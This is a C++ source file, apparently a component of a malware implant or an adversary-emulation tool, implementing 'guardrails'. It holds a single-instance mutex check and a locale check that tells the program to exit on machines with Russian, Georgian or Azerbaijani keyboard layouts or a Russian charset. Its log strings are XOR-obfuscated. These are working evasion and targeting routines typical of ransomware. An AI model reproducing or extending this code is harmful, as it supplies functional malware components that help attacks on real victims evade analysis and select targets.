#include "guardrails.hpp"


namespace Guardrails {

    HANDLE Guardrails::h_mutex = NULL;

    bool CheckCreateMutex() {
        XorLogger::LogInfo(std::vformat(XOR_LIT("Performing mutex check for mutex {}"), std::make_format_args(MUTEX_NAME)));
        HANDLE h_temp = CreateMutexA(NULL, false, MUTEX_NAME);
        DWORD error_code = GetLastError();
        if (h_temp != NULL) {
            if (error_code == ERROR_ALREADY_EXISTS) {
                XorLogger::LogInfo(XOR_LIT("Mutex already exists on system."));
                CloseHandle(h_temp);
                return false;
            }
            else {
                DWORD WaitForMutexError = WaitForSingleObject(h_temp, 0);
                if (WaitForMutexError) {
                    XorLogger::LogError(std::vformat(XOR_LIT("Failed wait for mutex. Error code {}"), std::make_format_args(WaitForMutexError)));
                    return false;
                }
                XorLogger::LogInfo(XOR_LIT("Created fresh mutex."));
                Guardrails::h_mutex = h_temp;
                return true;
            }
        }
        else {
            XorLogger::LogError(std::vformat(XOR_LIT("Failed to create mutex. Error code {}"), std::make_format_args(error_code)));
            return false;
        }

    }

    bool ReleaseMutex() {
        if (Guardrails::h_mutex == NULL) {
            return false;
        }
        if (!CloseHandle(Guardrails::h_mutex)) {
            DWORD error_code = GetLastError();
            XorLogger::LogError(std::vformat(XOR_LIT("Failed to release mutex. Error code {}"), std::make_format_args(error_code)));
            return false;
        }
        return true;
    }

    bool CheckLanguage() {
        const int georgian = 0x0437;
        const int russian = 0x0419;
        const int azerbaijani = 0x082C;

        // Get last 4 digits of keyboard layout
        HKL layout = GetKeyboardLayout(0);
        DWORD_PTR layout_parsed = reinterpret_cast<DWORD_PTR>(layout) & 0xffff;
        XorLogger::LogDebug(std::vformat(XOR_LIT("Keyboard layout: 0x{:04x}"), std::make_format_args(layout_parsed)));

        if (layout_parsed == georgian || layout_parsed == russian || layout_parsed == azerbaijani) {
            XorLogger::LogDebug(XOR_LIT("CIS language detected, exiting"));
            return false;
        }

        // Get charset
        HDC hdc = GetDC(NULL);
        BYTE charset = GetTextCharset(hdc);
        if (charset == RUSSIAN_CHARSET) {
            XorLogger::LogDebug(XOR_LIT("CIS character set detected, exiting"));
            return false;
        }

        return true;
    }

}